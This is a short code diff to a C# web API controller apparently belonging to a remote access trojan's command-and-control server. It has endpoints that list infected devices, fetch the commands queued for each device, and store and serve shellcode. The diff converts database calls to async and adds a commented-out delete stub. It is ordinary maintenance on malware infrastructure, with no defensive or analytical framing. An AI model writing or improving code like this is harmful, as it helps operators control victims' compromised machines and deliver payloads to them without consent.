@@ -29,24 +29,25 @@ namespace Rat_Server.Controllers
         }
 
         [HttpGet("GetAllInfectedDevices")]
-        public ActionResult<List<Device>> GetAllInfectedDevices()
+        public async Task<ActionResult<List<Device>>> GetAllInfectedDevices()
         {
-            return Ok(_context.Devices.ToList());
+            return Ok(await _context.Devices.ToListAsync());
         }
 
         [HttpGet("GetDeviceCommands/{deviceId}")]
-        public ActionResult<List<DeviceCommandDto>> GetDeviceCommands(Guid deviceId)
+        public async Task<ActionResult<List<DeviceCommandDto>>> GetDeviceCommands(Guid deviceId)
         {
-            if (_context.Devices.Find(deviceId) == null)
+            if (await _context.Devices.FindAsync(deviceId) == null)
             {
                 return NotFound("No Device with the corresponding deviceId was found");
             }
 
-            return Ok(_context.Commands.Where(q => q.DevicedHwid == deviceId).ToList());
+            return Ok(await _context.Commands.Where(q => q.DevicedHwid == deviceId).ToListAsync());
         }
 
         [HttpPost("AddShellCode")]
         [ProducesResponseType(StatusCodes.Status201Created)]
+        [ProducesResponseType(StatusCodes.Status400BadRequest)]
         [ProducesResponseType(StatusCodes.Status409Conflict)]
         public async Task<ActionResult> AddShellCode([FromBody] ShellCodeDto shellCodeDto)
         {
@@ -77,6 +78,11 @@ namespace Rat_Server.Controllers
                 return BadRequest(ex);
             }
         }
+
+/*        [HttpGet("DeleteShellCode/{id}")]
+        [ProducesResponseType(StatusCodes.Status204NoContent)]
+        [ProducesResponseType(StatusCodes.Status400BadRequest)]
+        [ProducesResponseType(StatusCodes.Status404NotFound)]*/
 
         [HttpGet("GetAllShellCode")]
         [ProducesResponseType(typeof(List<ShellCodeDto>), StatusCodes.Status200OK)]
